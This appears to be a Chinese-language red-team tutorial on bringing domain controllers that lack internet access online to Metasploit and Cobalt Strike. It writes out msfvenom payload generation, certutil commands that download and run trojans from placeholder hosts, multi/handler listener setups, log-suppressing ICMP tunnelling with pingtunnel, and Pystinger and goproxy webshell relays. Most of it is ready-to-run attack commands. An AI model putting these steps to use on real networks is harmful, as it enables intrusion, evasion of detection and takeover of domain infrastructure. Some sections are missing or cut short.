# 一、msf正向木马拿不出网域控shell

## msf生成木马

```
msfvenom -p windows/x64/meterpreter/bind\_tcp lport=4444 -f raw -o msf1.bin

```

用msfvenom生成一个正向马传进去（因为无法访问外网，反向出不来），msf正向连接。

![](../Images/ccb189797223a0d19b1f2eb559e282f1.png)

## 域控上线msf

通过域控web服务的shell进行操作，域控远程下载边界跳板机上的马

```
C:\\ProgramData\\xxxx.exe -i -c "certutil -urlcache -split -f http://xxx.xxx.xxx/msf1.exe msf1.exe
```

![](../Images/8af15e58da014b93ecd0cde0bd6f40fd.png)

  

再通过提权工具进行执行

```
C:\\ProgramData\\xxxx.exe -i -c "msf1.exe"
```

![](../Images/0640712b488c495070207a7cee57a0e0.png)

msf通过代理开启监听

```
proxychains msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/bind\_tcp
set RHOST xxx.xxx.xxx
set lport 4444
run
```

![](../Images/03bd6a9ea51681e59267ff1e1c6ac76c.png)

  

成功获取域控服务器的shell

![](../Images/4aa6949ad1280c5da6bcf6131bc508d2.png)

# 三、仅ICMP出网pingtunnel上线msf&cs

## 0\. 环境搭建

WEB边界服务器是公司对外提供Web服务的机器，该机器可以通内网，同时向公网提供服务。内网同网段存在一台Windows内网服务器域控，Web服务器可以访问该机器远程桌面。当我们拿到web边界服务器的shell之后发现只能使用icmp协议访问公网vps（ping），所以只能用ICMP搭建通往内网的隧道，访问内网服务器域控进行后续攻击操作。

## 1\. pingtunnel

注意，在客户端中运行一定要加noprint nolog两个参数，否则会生成大量的日志文件  
由于ICMP为网络层协议，应用层防火墙无法识别，且请求包当中的数据字段被加密

## 2\. vps服务端开启

```
./pingtunnel -type server       ##开启服务器模式

```

回显0连接

![](../Images/e3d2d84978877135a0ad339314eedde8.png)

## 3\. 客户端开启

```
pingtunnel.exe -type client -l 127.0.0.1:9999 -s icmpserver\_ip -t c2\_server\_ip:7777 -tcp 1 -noprint 1 -nolog 1
```

![](../Images/63c8dc327b6360ef2d55ee3c5f8e641c.png)

客户端本地监听9999端口 ，将监听到的连接流量通过icmpserver发送到vps的Linsten\_ip:7777端口  
执行后，kali有回显

![](../Images/10bc64a8b2bda80961fa2e4ad2603e5e.png)

## 4\. msf上线

制作木马，木马的回连地址为127.0.0.1:9999,运行上线msf

```
msfvenom -p windows/x64/meterpreter/reverse\_tcp LHOST=127.0.0.1 LPORT=9999 -f exe -o msf.exe
```

![](../Images/b7807264ad12a18cbfefca9839253e9c.png)

msf开启监听

```
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse\_tcp
set lhost x.x.x.x
set lport 7777
exploit -j
```

![](../Images/e2f4a7906153657417989ce86580693c.png)

把木马msf.exe从蚁剑上传到靶机，运行

![](../Images/eeba2f626ff39d930417d700b74add23.png)

  

已上线msf

![](../Images/884f6efb7d3992f5e2be087ecdc4d7af.png)

SPP

服务端启动


# 五、Pystinger正向代理上线不出网域控到cs

## 工具：

Pystinger

## 条件：

1.  TCP、ICMP、DNS均不出网。
    
2.  具有Web服务，并获得Webshell权限。  
    web边界服务器在仅ICMP出网的环境下，将ICMP出网的出站规则禁用
    

![](../Images/ddaefdeefabe6f9564489764ec271bb9.png)

环境机器不可以ping通其他机器

![](../Images/d0614222c15a3544e6d15d8de0fb5c45.png)

## 1\. 上传代理文件

1.  通过Webshell上传Pystinger的对应语言的Webshell到目标机器，实现内网SOCK4代理， 确保http://x.x.x.x/pystinger/proxy.php可以访问，页面返回 UTF-8。
    

![](../Images/5369495cecb136b7dfa0ae617d3f3188.png)

## 2\. 服务端运行

参考github上Cobalt Strike多主机上线方式，上传stingger\_server.exe到目标机器，然后运行

```
start stinger\_server.exe 0.0.0.0
```

![](../Images/49ac186112bf884f432ca1b5baf9b6dd.png)

## 3\. 客户端运行

在VPS上上传stinger\_client，-w proxy的url地址，执行

```
./stinger\_client -w http://x.x.x.x/pystinger/proxy.php -l 0.0.0.0 -p 60000
```

![](../Images/7d69b5648bfb65c0c6007cbbfcb6be73.png)

  

## 4\. 创建监听器

Cobalt Strike新建监听pystinger，多主机上线设置Host为目标机器能够与更深层机器相连的内网ip：x.x.x.x，端口为60020。  
单主机上线设置Host为目标机器的ip：127.0.0.1，端口为60020，只能本主机上线

![](../Images/aeb3deeaad4ba332360f3f3d27436b0c.png)

## 5\. 生成木马

![](../Images/5e437cdfab778bc0c82ec20c1c7564f7.png)

蚁剑运行木马文件

![](../Images/47add95d569677e4ee7cbe4934c0751b.png)

此时查看cs已上线

![](../Images/80d1b3f85137a0f910667fdbc3eb4a44.png)

# 六、goproxy http代理上线不出网域控到cs

goproxy

## 条件：

1.  TCP、ICMP、DNS均不出网。
    
2.  具有Web服务，并获得Webshell权限。  
    web边界服务器在仅ICMP出网的环境下，将ICMP出网的出站规则禁用![](../Images/ddaefdeefabe6f9564489764ec271bb9.png)
    

  

环境机器不可以ping通其他机器![](../Images/d0614222c15a3544e6d15d8de0fb5c45.png)

## 1\. 上传proxy.exe

通过Webshell上传proxy.exe到目标机器的可读可写目录，执行以下命令在这台出网主机开启一个4444端口的HTTP服务，供后面与不出网域控通讯。

```
proxy.exe http -t tcp -p "0.0.0.0:4444" --daemon
netstat -ano
```

![](../Images/c4f2468cddd5bf37f1151f5833948e87.png)

## 2\. 创建监听器

Cobalt strike创建监听器，代理地址为不出网域控能访问到的地址，http://x.x.x.x:4444![](../Images/e7e64c477931c4bf1cfe8fdd29072aa5.png)

## 3\. 生成木马

有效荷载选择Windows Executable(S)，不然无法上线

![](../Images/936626e9294e2ac74f3b187a12a7f9dc.png)

然后利用蚁剑将该文件上传到web服务器供不出网域控下载使用。  
不出网win2008执行如下命令，要写不出网win2008同层能访问到的地址，下载CS的有效载荷。  
certutil -urlcache -split -f http://x.x.x.x/xxx.exe C:\\xxx.exe

执行木马
